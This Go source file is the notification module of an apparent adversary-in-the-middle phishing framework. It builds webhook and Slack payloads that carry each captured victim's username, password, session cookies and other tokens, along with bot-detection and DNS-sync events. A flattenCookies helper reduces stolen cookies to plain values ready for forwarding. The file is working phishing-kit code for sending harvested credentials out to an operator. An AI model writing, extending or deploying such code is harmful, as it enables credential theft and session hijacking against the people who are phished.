// Package notify delivers event notifications to external systems (webhooks, Slack).
package notify

import (
	"net/http"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

// Notification is the common payload built by the dispatcher for every event.
// Webhook channels send this as-is; Slack channels format it into Block Kit.
type Notification struct {
	Event     sdk.EventType `json:"event"`
	Timestamp time.Time     `json:"timestamp"`
	Session   *SessionData  `json:"session,omitempty"`
	Bot       *BotData      `json:"bot,omitempty"`
	DNS       *DNSData      `json:"dns,omitempty"`
	Phishlet  string        `json:"phishlet,omitempty"`
}

// SessionData is a serialization-safe representation of a captured session.
// Cookie values are flattened to domain → name → value strings.
type SessionData struct {
	ID           string                       `json:"id"`
	Phishlet     string                       `json:"phishlet"`
	LureID       string                       `json:"lure_id"`
	RemoteAddr   string                       `json:"remote_addr"`
	UserAgent    string                       `json:"user_agent"`
	Username     string                       `json:"username,omitempty"`
	Password     string                       `json:"password,omitempty"`
	Custom       map[string]string            `json:"custom,omitempty"`
	CookieTokens map[string]map[string]string `json:"cookie_tokens,omitempty"`
	BodyTokens   map[string]string            `json:"body_tokens,omitempty"`
	HTTPTokens   map[string]string            `json:"http_tokens,omitempty"`
	StartedAt    time.Time                    `json:"started_at"`
	CompletedAt  *time.Time                   `json:"completed_at,omitempty"`
}

// BotData carries details about a detected bot.
type BotData struct {
	SessionID  string  `json:"session_id"`
	RemoteAddr string  `json:"remote_addr"`
	BotScore   float64 `json:"bot_score"`
	Verdict    string  `json:"verdict"`
	Reason     string  `json:"reason"`
}

// DNSData describes a DNS record synchronization event.
type DNSData struct {
	Zone     string `json:"zone"`
	Name     string `json:"name"`
	Type     string `json:"type"`
	Action   string `json:"action"`
	Provider string `json:"provider"`
}

// buildNotification converts an aitm.Event into a Notification payload.
func buildNotification(event aitm.Event) Notification {
	notification := Notification{
		Event:     event.Type,
		Timestamp: event.OccurredAt,
	}

	switch payload := event.Payload.(type) {
	case *aitm.Session:
		notification.Session = sessionData(payload)
	case aitm.BotDetectedPayload:
		notification.Bot = &BotData{
			SessionID:  payload.SessionID,
			RemoteAddr: payload.RemoteAddr,
			BotScore:   payload.BotScore,
			Verdict:    payload.Verdict,
			Reason:     payload.Reason,
		}
	case aitm.DNSSyncPayload:
		notification.DNS = &DNSData{
			Zone:     payload.Zone,
			Name:     payload.Name,
			Type:     payload.Type,
			Action:   string(payload.Action),
			Provider: payload.Provider,
		}
	case *aitm.Phishlet:
		notification.Phishlet = payload.Name
	case *aitm.ConfiguredPhishlet:
		notification.Phishlet = payload.Definition.Name
	}

	return notification
}

func sessionData(session *aitm.Session) *SessionData {
	data := &SessionData{
		ID:         session.ID,
		Phishlet:   session.Phishlet,
		LureID:     session.LureID,
		RemoteAddr: session.RemoteAddr,
		UserAgent:  session.UserAgent,
		Username:   session.Username,
		Password:   session.Password,
		Custom:     session.Custom,
		BodyTokens: session.BodyTokens,
		HTTPTokens: session.HTTPTokens,
		StartedAt:  session.StartedAt,
	}
	if session.CompletedAt != nil {
		completedAt := *session.CompletedAt
		data.CompletedAt = &completedAt
	}
	if len(session.CookieTokens) > 0 {
		data.CookieTokens = flattenCookies(session.CookieTokens)
	}
	return data
}

func flattenCookies(cookies map[string]map[string]*http.Cookie) map[string]map[string]string {
	flat := make(map[string]map[string]string, len(cookies))
	for domain, byName := range cookies {
		flat[domain] = make(map[string]string, len(byName))
		for name, cookie := range byName {
			flat[domain][name] = cookie.Value
		}
	}
	return flat
}
